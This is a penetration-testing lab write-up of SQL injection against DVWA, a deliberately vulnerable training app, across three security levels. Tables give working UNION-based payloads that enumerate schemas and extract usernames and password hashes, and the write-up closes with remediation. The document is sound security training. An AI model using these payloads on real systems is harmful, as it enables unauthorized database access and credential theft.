# SQL Injection (SQLi)

## Overview

SQL Injection (SQLi) is a vulnerability where user-controlled input is directly included in an SQL query without proper validation or parameterized queries. An attacker can manipulate SQL queries to retrieve, modify, or delete sensitive database information.

---

## Assessment Objective

Assess the SQL Injection module in DVWA across different security levels to understand how different security controls affect exploitation and how SQL Injection can be identified during a penetration test.

---

## Security Level Comparison

| Feature | Low | Medium | High |
|----------|------|---------|------|
| Input Method | GET | POST | Session Variable |
| User Input | Text Field | Dropdown List | Popup Window |
| Input Validation | None | `mysql_real_escape_string()` | Session-based processing |
| Request Modification | Direct | Burp Suite Required | Session value manipulated before SQL query |
| SQL Query | Directly uses user input | Numeric parameter remains injectable | Session value still reaches vulnerable query |
| Exploitation Difficulty | Easy | Moderate | Moderate |
| SQL Injection Possible | ✅ Yes | ✅ Yes | ✅ Yes |

---

# Low Security Level

## Reconnaissance

| Activity | Finding |
|----------|---------|
| Identified attack surface | User-controlled `id` parameter. |
| Request analysis | Input submitted using the GET method. |
| Response analysis | Returned user information changes according to supplied ID. |
| Initial assessment | User input directly influences database output. |

---

## Exploitation

| Phase | Payload / Command | Finding |
|------|--------------------|---------|
| Normal Request | `1` | Application returns valid user details. |
| Confirm SQLi | `' OR 1=1#` | All user records displayed. |
| Verify UNION | `' UNION SELECT 'Hello','World'#` | UNION injection confirmed. |
| Column Enumeration | `' UNION SELECT NULL,NULL#` | Query accepts 2 columns. |
| Reflection Check | `' UNION SELECT 1,2#` | Both columns reflected. |
| Database Enumeration | `' UNION SELECT database(),NULL#` | Database identified. |
| Table Enumeration | `' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()#` | Tables enumerated. |
| Column Enumeration | `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'#` | User and password columns identified. |
| Data Extraction | `' UNION SELECT user,password FROM users#` | Usernames and password hashes extracted. |

---

## Findings

- SQL Injection successfully confirmed.
- Complete database enumeration was possible.
- Usernames and password hashes were extracted.
- No security controls prevented exploitation.

---

## Evidence

### Screenshot 1 — SQL Injection Confirmed

```text
Payload:
' OR 1=1#
```

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/SQLi/01_low_payload.png" width="100%">
</p>

---

### Screenshot 2 — Usernames & Password Hashes Retrieved

```text
Payload:
' UNION SELECT user,password FROM users#
```

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/SQLi/02_low_result.png" width="100%">
</p>

---

# Medium Security Level

## Reconnaissance

| Activity | Finding |
|----------|---------|
| Compared previous level | GET request replaced with POST. |
| Identified client-side restriction | Text field replaced by dropdown. |
| HTTP analysis | Request intercepted using Burp Suite. |
| Attack surface verification | POST parameter remained user-controlled. |

---

## Exploitation

| Phase | Payload / Command | Finding |
|------|--------------------|---------|
| Intercept Request | Burp Suite → Proxy → Repeater | Request successfully modified. |
| Confirm SQLi | `1 UNION SELECT 1,2#` | UNION injection confirmed. |
| Database Enumeration | `1 UNION SELECT database(),NULL#` | Database identified. |
| Table Enumeration | `1 UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()#` | Tables enumerated. |
| Column Enumeration | `1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'#` | Columns identified. |
| Data Extraction | `1 UNION SELECT user,password FROM users#` | Password hashes extracted. |

---

## Findings

- Client-side restrictions were bypassed using Burp Suite.
- Basic filtering did not prevent SQL Injection.
- Database enumeration remained possible.
- Sensitive data was successfully extracted.

---

## Evidence

### Screenshot 1 — Modified Burp Request

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/SQLi/03_medium_payload.png" width="100%">
</p>

---

### Screenshot 2 — Usernames & Password Hashes Retrieved

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/SQLi/04_medium_result.png" width="100%">
</p>

---

# High Security Level

## Reconnaissance

| Activity | Finding |
|----------|---------|
| Reviewed workflow | User input collected through popup window. |
| Input tracing | Value stored in a session variable. |
| Backend analysis | Session value later used in SQL query. |
| Attack surface verification | User-controlled session value reaches vulnerable query. |

---

## Exploitation

| Phase | Payload / Command | Finding |
|------|--------------------|---------|
| Confirm SQLi | `a' UNION SELECT 'Hello','World'#` | UNION injection confirmed. |
| Database Enumeration | `a' UNION SELECT database(),NULL#` | Database identified. |
| Table Enumeration | `a' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()#` | Tables enumerated. |
| Column Enumeration | `a' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'#` | Columns identified. |
| Data Extraction | `a' UNION SELECT user,password FROM users#` | Password hashes extracted successfully. |

---

## Findings

- Session-based processing did not eliminate SQL Injection.
- Backend query remained vulnerable.
- Database enumeration was still possible.
- Sensitive user information was successfully extracted.

---

## Evidence

### Screenshot 1 — SQL Injection Confirmed

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/SQLi/05_high_payload.png" width="100%">
</p>

---

### Screenshot 2 — Usernames & Password Hashes Retrieved

<p align="center">
<img src="https://github.com/Tanya0xCyber/Web-Application-Security-Assessment-DVWA/blob/main/Screenshots/SQLi/06_high_result.png" width="100%">
</p>

---

# Root Cause

The application builds SQL queries using user-controlled input instead of parameterized queries. Although the input method changes across security levels, the underlying SQL query remains vulnerable.

---

# Overall Impact

- Unauthorized access to sensitive database information.
- Extraction of usernames and password hashes.
- Enumeration of databases, tables, and columns.
- Authentication bypass in vulnerable implementations.
- Potential modification or deletion of database records depending on database permissions.

---

# Remediation

- Use prepared statements (Parameterized Queries).
- Validate and sanitize all user inputs.
- Perform server-side input validation.
- Apply the principle of least privilege to database accounts.
- Disable verbose database error messages.
- Conduct regular security assessments and code reviews.
